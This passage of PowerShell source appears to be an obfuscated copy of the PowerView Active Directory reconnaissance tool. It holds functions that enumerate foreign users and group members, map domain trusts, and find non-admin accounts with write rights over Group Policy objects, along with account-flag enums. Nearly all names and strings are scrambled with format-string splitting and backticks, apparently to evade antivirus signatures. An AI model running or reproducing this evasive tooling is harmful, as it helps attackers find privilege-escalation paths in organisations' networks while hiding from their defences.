        if (${pS`BouN`dPARa`meTe`RS}['Raw']) { ${searcHe`RArgUm`eN`TS}['Raw'] = ${R`AW} }
    }

    PROCESS {
        &("{4}{0}{1}{3}{2}"-f 'e','t-Domain','r','Use','G') @SearcherArguments  | &("{3}{2}{1}{0}{4}" -f'Obje','Each-','r','Fo','ct') {
            ForEach (${ME`mBe`Rs`hiP} in ${_}."me`Mb`eROF") {
                ${I`NdEx} = ${MEmBe`RSh`iP}.("{2}{0}{1}" -f 'exO','f','Ind').Invoke('DC=')
                if (${IN`deX}) {

                    ${Groupdom`A`IN} = $(${mem`Be`R`shIp}.("{1}{0}{2}" -f'bS','Su','tring').Invoke(${i`N`DEx})) -replace 'DC=','' -replace ',','.'
                    ${usERdi`stI`N`G`UI`SHedn`AME} = ${_}."dISTI`Ng`U`I`sHEDNAMe"
                    ${uS`er`iNdEX} = ${US`eRD`IStIngui`she`DnA`mE}.("{1}{0}{2}" -f 'dexO','In','f').Invoke('DC=')
                    ${u`sERdOM`Ain} = $(${_}."D`Is`TIn`Gu`ISHeDNAme".("{0}{1}{2}"-f'Sub','Str','ing').Invoke(${U`s`erinDEX})) -replace 'DC=','' -replace ',','.'

                    if (${g`ROUPd`omAiN} -ne ${U`sERDo`MAIn}) {
                        
                        ${gRou`pn`AMe} = ${Mem`Bersh`iP}.("{1}{0}"-f 'it','Spl').Invoke(',')[0].("{0}{1}" -f'spli','t').Invoke('=')[1]
                        ${Fore`Ign`User} = &("{1}{0}{2}"-f'ec','New-Obj','t') ("{0}{1}"-f'PSObj','ect')
                        ${fOR`eignu`Ser} | &("{0}{2}{1}" -f'A','mber','dd-Me') ("{2}{1}{0}" -f'eproperty','ot','N') ("{2}{0}{1}" -f'i','n','UserDoma') ${USe`Rd`O`MaIN}
                        ${f`OREI`GNu`sEr} | &("{0}{1}{2}"-f'Add','-Mem','ber') ("{1}{0}{2}" -f'ropert','Notep','y') ("{1}{0}{2}" -f'erNam','Us','e') ${_}."SAm`AC`cOu`NtnaME"
                        ${fo`RE`iGNUs`ER} | &("{0}{2}{1}"-f 'A','Member','dd-') ("{2}{3}{0}{1}"-f'propert','y','No','te') ("{1}{0}{2}{6}{4}{3}{5}"-f 'erDistin','Us','g','dNam','e','e','uish') ${_}."d`IS`TINg`UiShED`NAme"
                        ${fOr`eIGnU`S`eR} | &("{3}{0}{2}{1}" -f 'dd-Memb','r','e','A') ("{1}{0}{2}{3}"-f 'roper','Notep','t','y') ("{2}{1}{3}{0}" -f'in','up','Gro','Doma') ${gROUp`DO`mAin}
                        ${fOre`IgNU`s`eR} | &("{1}{2}{0}"-f 'Member','A','dd-') ("{1}{0}{2}"-f 'oteprop','N','erty') ("{2}{0}{1}"-f'pNa','me','Grou') ${G`R`OUpnaMe}
                        ${FoReigNU`S`er} | &("{0}{2}{1}"-f'Ad','Member','d-') ("{0}{1}{2}"-f'Noteproper','t','y') ("{3}{1}{4}{2}{0}" -f'dName','upDis','guishe','Gro','tin') ${M`E`mbERshIP}
                        ${FoR`Ei`GnUSeR}."PsO`BJECT"."Typ`eNA`MeS".("{0}{1}{2}" -f 'I','nse','rt').Invoke(0, ("{2}{1}{3}{4}{0}"-f'er','rView','Powe','.Foreign','Us'))
                        ${ForEI`g`NUSER}
                    }
                }
            }
        }
    }
}


function gEt`-d`oMAinfOR`Ei`GnGR`OUpm`E`M`BEr {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{2}{4}{0}"-f's','PSS','uldProc','ho','es'}, '')]
    [OutputType({"{5}{7}{6}{4}{1}{0}{3}{2}" -f 'ro','nG','r','upMembe','.Foreig','Pow','w','erVie'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSITiOn = 0, valueFROMpIpeLinE = ${tR`Ue}, vAlUeFromPipElInEBYPropeRtYNAme = ${tr`Ue})]
        [Alias({"{0}{1}" -f'N','ame'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${Dom`AiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}"-f'Fi','er','lt'})]
        [String]
        ${L`dApf`ILT`er},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${p`Rope`RtIES},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}"-f'h','ADSP','at'})]
        [String]
        ${sEa`RcH`Ba`Se},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{3}{4}{1}{2}"-f 'DomainCo','le','r','nt','rol'})]
        [String]
        ${S`eR`VEr},

        [ValidateSet({"{1}{0}" -f'e','Bas'}, {"{2}{0}{1}" -f'Lev','el','One'}, {"{1}{2}{0}"-f'e','Subtr','e'})]
        [String]
        ${S`EaR`CH`sCOPE} = ("{1}{0}{2}" -f'e','Subtr','e'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`esuLT`pAgesIzE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${Ser`Ve`RT`iMEl`imit},

        [ValidateSet({"{0}{1}"-f 'D','acl'}, {"{1}{0}"-f 'oup','Gr'}, {"{0}{1}" -f'N','one'}, {"{1}{0}"-f 'er','Own'}, {"{0}{1}"-f 'Sa','cl'})]
        [String]
        ${SEc`U`Ri`TYmASKS},

        [Switch]
        ${tO`MB`Stone},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`REDE`N`TiAL} =  (  vaRIable ('qF'+'N') -VALUeO)::"e`MPTy"
    )

    BEGIN {
        ${s`e`ARcHEr`A`Rg`UMents} = @{}
        ${sEar`ChER`ARG`UMENTs}[("{2}{0}{1}" -f'APFi','lter','LD')] = (("{2}{3}{0}{1}" -f 'ember=','*)','(','m'))
        if (${P`s`BoUndPa`RaMETE`RS}[("{1}{2}{0}" -f'in','Dom','a')]) { ${Se`A`Rc`HER`ARGu`MEntS}[("{1}{0}{2}" -f 'ai','Dom','n')] = ${d`oMaiN} }
        if (${pS`BOu`NDPAram`eTe`RS}[("{0}{2}{1}"-f'Prop','rties','e')]) { ${SearC`H`eraRGU`M`eNTS}[("{2}{0}{1}{3}"-f 'rti','e','Prope','s')] = ${pRo`p`eRTI`Es} }
        if (${PSB`OUNDpaRame`TE`RS}[("{2}{1}{0}"-f 'se','Ba','Search')]) { ${SEarc`heRA`R`g`UmE`NTs}[("{2}{0}{1}"-f'a','rchBase','Se')] = ${Se`Arch`BaSe} }
        if (${p`sBOUNDpArA`M`ETErs}[("{2}{0}{1}"-f've','r','Ser')]) { ${sEA`RC`hERArGUMEn`Ts}[("{0}{1}" -f'Serv','er')] = ${S`er`VER} }
        if (${ps`B`ou`NdpA`RA`meTERS}[("{1}{2}{0}" -f 'ope','SearchS','c')]) { ${SEA`RChERa`Rg`U`mE`NtS}[("{1}{3}{2}{0}" -f'pe','Sear','o','chSc')] = ${sEARCh`S`cO`pe} }
        if (${PSBOund`p`A`R`AMeTeRs}[("{3}{1}{2}{0}"-f 'ze','ltP','ageSi','Resu')]) { ${SeAR`cH`erARg`Um`eNTS}[("{3}{2}{0}{1}"-f'Pa','geSize','t','Resul')] = ${RES`Ul`Tpa`GEsize} }
        if (${P`sbOUNdP`A`RAM`EteRs}[("{2}{0}{1}{3}"-f'r','T','Serve','imeLimit')]) { ${sEARcHe`R`ARG`Um`enTS}[("{4}{1}{0}{3}{2}" -f'rv','e','TimeLimit','er','S')] = ${se`RvErT`iM`eLi`mIT} }
        if (${P`sBOUn`dp`ARaM`et`ers}[("{0}{3}{2}{1}" -f'Secur','sks','yMa','it')]) { ${s`e`ARC`HeRaRGU`Me`NTS}[("{1}{0}{2}" -f 's','SecurityMa','ks')] = ${s`ecuR`itym`ASKs} }
        if (${PS`BO`UndPa`RAmETERs}[("{1}{0}"-f 'mbstone','To')]) { ${SE`AR`ChE`RA`RgUMEnTS}[("{2}{1}{0}"-f 'bstone','om','T')] = ${tO`m`BsTO`Ne} }
        if (${PsbOUN`d`pA`RameTErs}[("{1}{2}{0}" -f'l','Creden','tia')]) { ${s`EA`RcHERA`R`gu`mEnTs}[("{2}{1}{0}"-f'ntial','e','Cred')] = ${cre`dENti`Al} }
        if (${psB`Oun`D`P`Ara`meTeRs}['Raw']) { ${SE`ARC`hERargUM`eNTs}['Raw'] = ${R`Aw} }
    }

    PROCESS {
        
        ${Exc`lU`DegR`OuPs} = @(("{0}{1}" -f 'User','s'), ("{0}{1}{2}" -f 'Domain',' U','sers'), ("{1}{0}"-f's','Guest'))

        &("{2}{3}{1}{0}" -f 'nGroup','ai','G','et-Dom') @SearcherArguments | &("{1}{0}{2}"-f 'e-O','Wher','bject') { ${eXcl`UDEG`R`oUPS} -notcontains ${_}."Sam`ACc`oun`Tname" } | &("{1}{3}{2}{0}"-f'ect','Fo','j','rEach-Ob') {
            ${grou`PNa`ME} = ${_}."SAMAccouN`T`N`AME"
            ${grO`UpDI`StIn`guIS`He`Dn`AmE} = ${_}."dISTiN`gUI`SH`ednAMe"
            ${gRoUpD`O`MAin} = ${g`RoUP`dI`sT`In`GuISheD`N`AmE}.("{0}{1}{2}" -f 'SubSt','r','ing').Invoke(${GRo`Up`Di`sTI`NGUIsHEdN`AmE}.("{1}{0}" -f'exOf','Ind').Invoke('DC=')) -replace 'DC=','' -replace ',','.'

            ${_}."MeM`BEr" | &("{2}{0}{1}"-f'h-','Object','ForEac') {
                
                
                ${Me`mBe`RdoM`AiN} = ${_}.("{2}{1}{0}"-f 'tring','S','Sub').Invoke(${_}.("{1}{0}"-f 'f','IndexO').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                if ((${_} -match ("{1}{3}{2}{0}"-f '*-.*','C','1-5-21.','N=S-')) -or (${GroUPdoM`A`IN} -ne ${MEmBeRD`om`Ain})) {
                    ${mEmBer`DI`stiNguISHEDn`A`Me} = ${_}
                    ${M`EMbe`RNAme} = ${_}.("{0}{1}"-f'Spl','it').Invoke(',')[0].("{0}{1}" -f'spl','it').Invoke('=')[1]

                    ${f`OreIgNgrOuP`ME`mB`Er} = &("{2}{0}{1}"-f '-Obj','ect','New') ("{0}{2}{1}" -f 'PSO','ject','b')
                    ${FoReig`NgRO`UpME`Mber} | &("{2}{0}{1}"-f'e','mber','Add-M') ("{2}{0}{1}"-f 'o','teproperty','N') ("{0}{3}{1}{2}" -f'Grou','oma','in','pD') ${g`ROu`P`dOmAIN}
                    ${fo`REignGrOu`Pm`Em`BEr} | &("{2}{0}{1}" -f'Memb','er','Add-') ("{1}{0}{2}{3}" -f'ote','N','proper','ty') ("{0}{1}{2}" -f 'Gro','u','pName') ${Gr`OuPN`Ame}
                    ${F`o`REi`g`NGrOupm`Em`BER} | &("{0}{3}{2}{1}" -f'Add','r','Membe','-') ("{0}{1}{2}{3}"-f'Notepr','o','pe','rty') ("{2}{1}{5}{4}{6}{0}{3}" -f 'd','g','GroupDistin','Name','h','uis','e') ${GR`ou`PdisTIN`g`UishedNaME}
                    ${fORe`i`g`NgroUpm`EmbER} | &("{0}{3}{1}{2}"-f 'Add','mbe','r','-Me') ("{2}{1}{3}{0}"-f 'perty','te','No','pro') ("{1}{0}{2}" -f'berDoma','Mem','in') ${m`EMB`E`RdOMAiN}
                    ${FOREIgn`GrouP`mem`Ber} | &("{2}{1}{0}" -f 'ber','m','Add-Me') ("{1}{0}{3}{2}" -f 'tepr','No','erty','op') ("{2}{1}{0}"-f'mberName','e','M') ${MEM`BEr`NAME}
                    ${f`oRe`I`GNgR`OUPmeMbeR} | &("{1}{2}{0}" -f'ember','A','dd-M') ("{0}{1}{2}" -f 'N','otepropert','y') ("{1}{4}{3}{0}{2}" -f 'tinguished','M','Name','mberDis','e') ${MeM`BeRdIsTInGui`sH`e`d`Na`Me}
                    ${F`OrEI`Gn`G`RouPMEMBeR}."p`soBjE`Ct"."TYp`En`AmES".("{0}{1}" -f'In','sert').Invoke(0, ("{1}{2}{4}{7}{5}{6}{3}{8}{0}"-f 'Member','Po','we','u','rVie','reignGr','o','w.Fo','p'))
                    ${FO`REig`NGROUpMEm`BEr}
                }
            }
        }
    }
}


function g`eT-`d`OmaInTR`UstmAppI`Ng {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{0}{1}{2}" -f 'd','Proc','ess','PSShoul'}, '')]
    [OutputType({"{2}{1}{0}{6}{5}{4}{3}"-f 'er','ow','P','NET','ust.','w.DomainTr','Vie'})]
    [OutputType({"{5}{3}{2}{0}{4}{6}{1}" -f 't.','P','Trus','n','L','PowerView.Domai','DA'})]
    [OutputType({"{3}{0}{4}{5}{1}{2}" -f 'werV','i','nTrust.API','Po','iew.Dom','a'})]
    [CmdletBinding(DeFAUlTpaRamEtErsEtNamE = {"{1}{0}"-f 'DAP','L'})]
    Param(
        [Parameter(pARaMETErsETNaME = 'API')]
        [Switch]
        ${A`pI},

        [Parameter(parAmETERSeTname = 'NET')]
        [Switch]
        ${N`Et},

        [Parameter(paramETERSETnamE = "l`DAP")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}" -f 'l','ter','Fi'})]
        [String]
        ${l`dApfi`LT`er},

        [Parameter(PArAMETersETnamE = "lD`Ap")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${p`R`o`peRtiES},

        [Parameter(paramETerSetnaME = "lD`AP")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f 'h','ADSPat'})]
        [String]
        ${sE`ArChB`ASE},

        [Parameter(pArameTeRseTnamE = "l`dap")]
        [Parameter(pArAmETeRsETnAMe = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{0}{1}{2}{3}" -f 'ntro','l','le','r','DomainCo'})]
        [String]
        ${S`E`Rver},

        [Parameter(PArAMETeRsetnAmE = "l`dAp")]
        [ValidateSet({"{0}{1}"-f'Bas','e'}, {"{1}{0}{2}" -f 'Leve','One','l'}, {"{0}{2}{1}"-f'Su','ee','btr'})]
        [String]
        ${Sear`C`H`ScOPe} = ("{1}{0}" -f 'ee','Subtr'),

        [Parameter(PARAMEterSEtnAmE = "L`DAp")]
        [ValidateRange(1, 10000)]
        [Int]
        ${rESUl`Tp`AgeS`IZe} = 200,

        [Parameter(PaRAmEteRsetNAME = "l`DAP")]
        [ValidateRange(1, 10000)]
        [Int]
        ${sErV`er`T`Imel`Imit},

        [Parameter(PaRameteRsEtnAMe = "L`dAp")]
        [Switch]
        ${ToMBs`T`O`Ne},

        [Parameter(PaRAMetERSEtNaMe = "lD`AP")]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRedeN`T`Ial} =  (  VaRiABLe ("{0}{1}" -f'Qf','n') -ValUEo  )::"eM`pTy"
    )

    
    ${SEe`Ndo`mAIns} = @{}

    
    ${dO`M`AinS} = &("{1}{0}{2}" -f'ew-Obj','N','ect') ("{3}{4}{5}{0}{2}{1}"-f'.Collections.','ack','St','Sys','t','em')

    ${DO`MAI`NtrU`S`T`Arguments} = @{}
    if (${PSbOUndpaR`AMe`T`ers}['API']) { ${doMaiNtrUstaRG`Um`e`N`TS}['API'] = ${A`PI} }
    if (${p`sBoU`N`D`paRA`meteRs}['NET']) { ${D`OmaIN`TR`USTA`RgU`mEnTs}['NET'] = ${n`Et} }
    if (${PS`BoU`Nd`PARA`meTErS}[("{0}{2}{1}{3}"-f'L','lte','DAPFi','r')]) { ${dOMAINt`RUstarg`UM`eNTs}[("{2}{1}{0}" -f 'Filter','AP','LD')] = ${L`D`ApFil`TeR} }
    if (${ps`BOUnD`P`ARAm`et`erS}[("{0}{2}{1}"-f 'Pro','s','pertie')]) { ${D`Omain`TR`UsT`A`Rg`UMeNtS}[("{0}{2}{1}" -f'Propert','s','ie')] = ${PRo`PE`RT`iEs} }
    if (${PsbOundPa`R`AMeTe`Rs}[("{2}{3}{0}{1}" -f 'as','e','Se','archB')]) { ${dOmAi`NtRUST`Argu`m`enTS}[("{1}{2}{0}{3}"-f 'ch','Se','ar','Base')] = ${SeA`RcH`BA`se} }
    if (${p`s`Bou`NdPaR`Amet`ers}[("{0}{1}" -f'Serv','er')]) { ${DOMai`N`T`RUS`Tar`Gum`ENts}[("{1}{2}{0}"-f'r','S','erve')] = ${serV`Er} }
    if (${p`sBoun`D`pARAmet`E`Rs}[("{2}{1}{0}" -f 'cope','S','Search')]) { ${dOm`Ai`NT`RU`S`TArGuME`Nts}[("{2}{0}{1}"-f 'chSc','ope','Sear')] = ${s`eArcHS`co`pE} }
    if (${p`sBo`UnDPAr`A`MeT`ERS}[("{1}{0}{2}"-f'ultP','Res','ageSize')]) { ${DO`MAi`Nt`RU`staRgUmeNTs}[("{0}{1}{2}"-f'Res','ultPageSiz','e')] = ${Re`SULT`pA`G`ESize} }
    if (${psBo`UndP`ARa`meTe`Rs}[("{1}{0}{3}{2}" -f 'rTi','Serve','it','meLim')]) { ${D`oMaint`R`UStaRGUmE`N`Ts}[("{1}{2}{3}{0}"-f 'Limit','Ser','ver','Time')] = ${S`eR`VERTIM`EL`imIt} }
    if (${Psb`ouNdpara`m`eT`eRs}[("{0}{2}{3}{1}" -f 'To','one','m','bst')]) { ${DoM`AI`N`TR`UstA`RgUMenTs}[("{2}{1}{0}"-f 'ne','bsto','Tom')] = ${ToM`BST`ONe} }
    if (${PSBoUnDp`AR`AMe`T`E`Rs}[("{0}{2}{1}" -f'Creden','l','tia')]) { ${dom`Aint`RUS`T`Argu`mEnTS}[("{0}{1}{2}"-f'C','r','edential')] = ${creD`E`NtiAL} }

    
    if (${PsBoU`NDpa`Ra`M`etE`RS}[("{0}{2}{1}"-f'Cred','ial','ent')]) {
        ${C`URR`eNT`Do`MAIn} = (&("{0}{3}{2}{1}" -f'G','Domain','t-','e') -Credential ${CRED`ENTI`Al})."N`AMe"
    }
    else {
        ${CuR`RentDO`ma`in} = (&("{1}{2}{0}{3}" -f'mai','Ge','t-Do','n'))."N`AMe"
    }
    ${dO`m`AinS}.("{0}{1}"-f 'Pus','h').Invoke(${Cu`RrE`NTDoM`A`IN})

    while(${DoM`Ai`Ns}."CO`UnT" -ne 0) {

        ${do`MA`IN} = ${d`O`mAins}.("{0}{1}" -f 'Po','p').Invoke()

        
        if (${DoM`AiN} -and (${DO`M`AiN}.("{1}{0}"-f 'm','Tri').Invoke() -ne '') -and (-not ${SE`E`NDomAiNS}.("{3}{1}{0}{2}" -f'e','ntainsK','y','Co').Invoke(${dO`MAin}))) {

            &("{2}{3}{1}{0}"-f'bose','r','Write-','Ve') ('[Get-Domai'+'nTr'+'ustM'+'ap'+'ping] '+'Enu'+'me'+'rati'+'ng '+'tru'+'st'+'s '+'f'+'or '+'doma'+'i'+'n: '+"'$Domain'")

            
            ${n`Ull} = ${Se`eNdom`AiNs}.("{0}{1}"-f 'Ad','d').Invoke(${do`mAiN}, '')

            try {
                
                ${DoMAiN`T`RUS`TA`RGU`Men`Ts}[("{1}{0}" -f 'omain','D')] = ${D`o`MAiN}
                ${tRU`sTs} = &("{0}{3}{1}{2}" -f'Get','nT','rust','-Domai') @DomainTrustArguments

                if (${Tr`UstS} -isnot [System.Array]) {
                    ${Tru`stS} = @(${TR`Us`TS})
                }

                
                if (${PsCM`DL`ET}.PaRAMETerSEtNAme -eq 'NET') {
                    ${fo`R`E`stT`RUSta`R`GumeNTS} = @{}
                    if (${P`sboUNDpar`A`ME`T`ErS}[("{2}{1}{0}" -f'est','r','Fo')]) { ${foreStt`RuSTa`R`gumENtS}[("{0}{1}" -f 'Fores','t')] = ${FO`RE`St} }
                    if (${PsBoU`N`DPARa`mEterS}[("{3}{2}{0}{1}" -f'denti','al','re','C')]) { ${fOREs`TT`Ru`sTarGuMENtS}[("{1}{2}{0}" -f'edential','C','r')] = ${cre`d`ENTi`AL} }
                    ${tRu`STs} += &("{1}{4}{3}{2}{0}" -f 't','Ge','rus','stT','t-Fore') @ForestTrustArguments
                }

                if (${TrU`Sts}) {
                    if (${T`R`UsTS} -isnot [System.Array]) {
                        ${t`RuS`Ts} = @(${truS`Ts})
                    }

                    
                    ForEach (${t`RuSt} in ${TruS`Ts}) {
                        if (${TrU`sT}."SoURCE`N`A`mE" -and ${tR`U`ST}."targ`e`TnAmE") {
                            
                            ${NU`LL} = ${DOmai`NS}.("{1}{0}" -f 'ush','P').Invoke(${Tr`USt}."Ta`RG`e`TNAME")
                            ${tR`U`St}
                        }
                    }
                }
            }
            catch {
                &("{2}{0}{3}{1}"-f 'ite-V','ose','Wr','erb') ('[Get'+'-Do'+'mainTrus'+'tMapp'+'i'+'ng] '+'Error'+': '+"$_")
            }
        }
    }
}


function G`Et`-G`PodELeGAt`IoN {


    [CmdletBinding()]
    Param (
        [String]
        ${g`pO`NamE} = '*',

        [ValidateRange(1,10000)] 
        [Int]
        ${pag`ES`IZE} = 200
    )

    ${EXCL`US`IOns} = @(("{0}{1}{2}" -f'S','YSTE','M'),("{0}{1}{3}{2}"-f'Dom','ain A','s','dmin'),("{2}{4}{1}{3}{0}" -f 'Admins','erpr','En','ise ','t'))

    ${FORE`sT} =  ${hW`VA}::("{0}{4}{1}{3}{2}"-f 'Get','tFor','st','e','Curren').Invoke()
    ${D`omAi`Nli`sT} = @(${FoR`E`st}."DOM`AI`NS")
    ${D`OMai`Ns} = ${doma`in`list} | &("{0}{2}{1}"-f'forea','h','c') { ${_}.("{0}{4}{2}{1}{3}{5}" -f 'Ge','irec','D','to','t','ryEntry').Invoke() }
    foreach (${d`O`MAiN} in ${Do`MaINs}) {
        ${fiL`T`Er} = "(&(objectCategory=groupPolicyContainer)(displayname=$GPOName))"
        ${sEA`RcH`Er} = &("{0}{2}{1}" -f 'N','w-Object','e') ("{8}{0}{5}{6}{2}{1}{3}{7}{4}{9}" -f 'em','rvices.Di','orySe','re','a','.Dir','ect','ctorySe','Syst','rcher')
        ${se`ARC`h`eR}."se`ARCHRo`ot" = ${DoMa`In}
        ${sEarC`h`eR}."fi`Lter" = ${fil`TeR}
        ${SE`A`Rc`Her}."PAGeS`i`Ze" = ${paGES`I`Ze}
        ${sea`R`c`HER}."s`eARch`SCoPe" = ("{1}{2}{0}" -f 'e','Subtr','e')
        ${lIS`TgPo} = ${sEa`RchER}.("{1}{2}{0}"-f'All','Fi','nd').Invoke()
        foreach (${g`Po} in ${li`st`Gpo}){
            ${A`Cl} = ([ADSI]${g`Po}."pa`Th")."objECTseC`U`RITy"."AC`cE`sS" | &('?') {${_}."Ac`TIv`Ed`ire`CToryri`gHTs" -match ("{0}{1}" -f'Writ','e') -and ${_}."ac`c`esScOntro`L`Type" -eq ("{0}{1}"-f'All','ow') -and  ${eX`clu`Sio`NS} -notcontains ${_}."idEN`Ti`T`Y`ReFerence".("{1}{0}"-f'ring','toSt').Invoke().("{1}{0}" -f 'it','spl').Invoke("\")[1] -and ${_}."ide`N`TIT`YReFer`en`cE" -ne ("{3}{2}{0}{1}"-f 'ATOR OWN','ER','RE','C')}
        if (${A`cL} -ne ${Nu`Ll}){
            ${gpOA`Cl} = &("{2}{3}{0}{1}"-f 'e','ct','New-Ob','j') ("{0}{2}{1}" -f 'p','ct','sobje')
            ${GPOA`cL} | &("{2}{1}{0}" -f'mber','dd-Me','A') ("{1}{0}{2}{3}"-f 'teprop','No','er','ty') ("{1}{0}" -f'DSPath','A') ${g`pO}."pRoPEr`T`ieS"."A`dSP`ATh"
            ${gP`oA`cL} | &("{2}{1}{0}" -f 'er','b','Add-Mem') ("{3}{1}{2}{0}"-f'y','eprope','rt','Not') ("{2}{3}{1}{0}" -f 'e','m','GPODi','splayNa') ${G`PO}."P`R`opERtiES"."d`i`SpLaYNaME"
            ${gPo`A`cL} | &("{0}{1}{2}" -f'A','dd','-Member') ("{1}{0}{2}"-f 'pro','Note','perty') ("{4}{2}{1}{3}{0}"-f'ence','ntityR','e','efer','Id') ${A`CL}."iDENti`T`yref`ereN`Ce"
            ${gp`OaCL} | &("{1}{0}{2}" -f'Membe','Add-','r') ("{1}{0}{2}{3}" -f'e','Not','pro','perty') ("{6}{3}{5}{0}{1}{2}{4}" -f 'oryR','ig','h','Di','ts','rect','Active') ${a`Cl}."acTiVE`D`ir`e`C`TO`RYRIGHtS"
            ${g`po`AcL}
        }
        }
    }
}











${m`OD} = &("{1}{3}{4}{0}{2}"-f'du','New','le','-InM','emoryMo') -ModuleName ("{1}{0}"-f'32','Win')




${sa`m`A`c`COunT`TypEENUm} = &("{0}{1}"-f'p','senum') ${m`oD} ("{2}{6}{5}{3}{4}{0}{1}"-f 'tTypeEn','um','Powe','u','n','View.SamAcco','r') ("{1}{0}"-f '2','UInt3') @{
    ("{0}{1}{2}"-f'DOMAIN','_OB','JECT')                   =   ("{1}{2}{0}" -f '0000','0','x0000')
    ("{1}{2}{0}" -f '_OBJECT','G','ROUP')                    =   ("{2}{1}{0}" -f'000000','10','0x')
    ("{2}{0}{1}{4}{3}"-f 'ON_SECURITY_GR','OUP_OBJE','N','T','C')       =   ("{2}{0}{1}" -f '00000','01','0x1')
    ("{3}{2}{0}{1}"-f'O','BJECT','S_','ALIA')                    =   ("{1}{2}{0}"-f '00000','0x20','0')
    ("{0}{4}{5}{6}{2}{1}{3}"-f 'NON_','L','A','IAS_OBJECT','SEC','U','RITY_')       =   ("{0}{1}{2}"-f '0x2','0000','001')
    ("{3}{0}{2}{1}"-f'ER_O','T','BJEC','US')                     =   ("{0}{2}{1}" -f '0x30','000','000')
    ("{0}{2}{1}" -f'MACH','NT','INE_ACCOU')                 =   ("{0}{1}{2}"-f '0x30','0000','01')
    ("{1}{3}{2}{0}{4}" -f'T_','T','S','RU','ACCOUNT')                   =   ("{1}{2}{0}" -f '2','0x30','00000')
    ("{0}{1}{2}{3}"-f'A','PP','_BASIC_','GROUP')                 =   ("{2}{0}{1}"-f '0000','000','0x4')
    ("{0}{1}{4}{3}{2}" -f'APP_Q','UERY','UP','RO','_G')                 =   ("{0}{3}{2}{1}" -f '0','0001','4000','x')
    ("{2}{0}{1}" -f 'NT_TYPE_','MAX','ACCOU')                =   ("{1}{0}{2}"-f 'fff','0x7ff','ff')
}


${gRoupty`P`EeNUm} = &("{0}{1}"-f'p','senum') ${m`Od} ("{0}{5}{3}{4}{1}{2}"-f'Pow','Enu','m','ro','upType','erView.G') ("{1}{0}"-f'nt32','UI') @{
    ("{4}{1}{2}{3}{0}{5}"-f'S','ED_BY','_','SY','CREAT','TEM')               =   ("{1}{2}{0}" -f'000001','0x0','0')
    ("{3}{0}{2}{1}"-f'OBAL','SCOPE','_','GL')                    =   ("{1}{0}{2}"-f '0000000','0x','2')
    ("{0}{4}{2}{3}{1}" -f 'DOMAI','COPE','LOCAL_','S','N_')              =   ("{0}{1}{2}"-f'0','x000','00004')
    ("{1}{3}{4}{0}{2}"-f'SAL_S','UN','COPE','IV','ER')                 =   ("{0}{1}{2}"-f'0x000','0000','8')
    ("{0}{2}{1}" -f'AP','ASIC','P_B')                       =   ("{0}{2}{1}"-f'0x0000','010','0')
    ("{2}{1}{0}"-f'UERY','_Q','APP')                       =   ("{1}{0}{2}{3}"-f '0','0x','0000','020')
    ("{1}{0}{2}" -f 'CUR','SE','ITY')                        =   ("{2}{0}{3}{1}"-f 'x80','000','0','000')
} -Bitfield


${u`Ac`enum} = &("{1}{0}"-f 'senum','p') ${M`Od} ("{2}{3}{1}{0}"-f 'Enum','C','PowerView.U','A') ("{1}{0}" -f '2','UInt3') @{
    ("{1}{0}" -f'CRIPT','S')                          =   1
    ("{0}{1}{2}" -f'ACCOUN','TDISAB','LE')                  =   2
    ("{1}{2}{3}{0}"-f 'D','HOM','EDIR_','REQUIRE')                =   8
    ("{2}{1}{0}" -f'UT','OCKO','L')                         =   16
    ("{2}{1}{0}{3}"-f 'NO','SSWD_','PA','TREQD')                  =   32
    ("{4}{2}{3}{1}{0}" -f 'HANGE','C','CANT','_','PASSWD_')              =   64
    ("{0}{3}{2}{4}{5}{6}{1}" -f 'ENCRYP','ED','D_','TE','T','EXT_P','WD_ALLOW')      =   128
    ("{0}{2}{3}{4}{1}" -f'TEMP_DUPLI','ACCOUNT','CA','T','E_')          =   256
    ("{0}{3}{1}{2}{4}"-f'N','AL','_','ORM','ACCOUNT')                  =   512
    ("{6}{4}{7}{0}{3}{1}{2}{5}"-f'_T','ACCO','U','RUST_','D','NT','INTER','OMAIN')       =   2048
    ("{2}{5}{0}{4}{7}{3}{6}{1}" -f'I','CCOUNT','WOR','T_','ON','KSTAT','A','_TRUS')       =   4096
    ("{2}{3}{1}{0}"-f 'T','OUN','SER','VER_TRUST_ACC')            =   8192
    ("{3}{1}{0}{4}{2}" -f 'PIRE_PAS','EX','ORD','DONT_','SW')            =   65536
    ("{4}{1}{2}{0}{3}"-f '_ACCOU','G','ON','NT','MNS_LO')               =   131072
    ("{3}{2}{0}{1}{4}" -f'R','D_REQUI','MARTCA','S','RED')              =   262144
    ("{3}{4}{1}{2}{0}" -f'ON','OR_DELEGA','TI','TRUSTED_','F')          =   524288
    ("{2}{0}{1}"-f'T_DELEGA','TED','NO')                   =   1048576
    ("{2}{0}{1}" -f'EY_O','NLY','USE_DES_K')                =   2097152
    ("{0}{2}{1}{3}" -f 'DONT','UT','_REQ_PREA','H')                =   4194304
    ("{3}{2}{1}{0}{4}" -f 'PIRE','_EX','WORD','PASS','D')                =   8388608
    ("{4}{1}{3}{0}{6}{5}{2}"-f '_D','_','TION','FOR','TRUSTED_TO_AUTH','EGA','EL')  =   16777216
    ("{0}{4}{2}{1}{3}" -f'PA','ECRETS','AL_S','_ACCOUNT','RTI')         =   67108864
} -Bitfield


${WTsCONn`ECtsT`Ate} = &("{0}{1}" -f'pse','num') ${m`oD} ("{2}{4}{0}{1}{5}{3}"-f'TSTAT','E_','WTS_CON','LASS','NEC','C') ("{0}{1}" -f 'UIn','t16') @{
    ("{0}{1}"-f 'Activ','e')       =    0
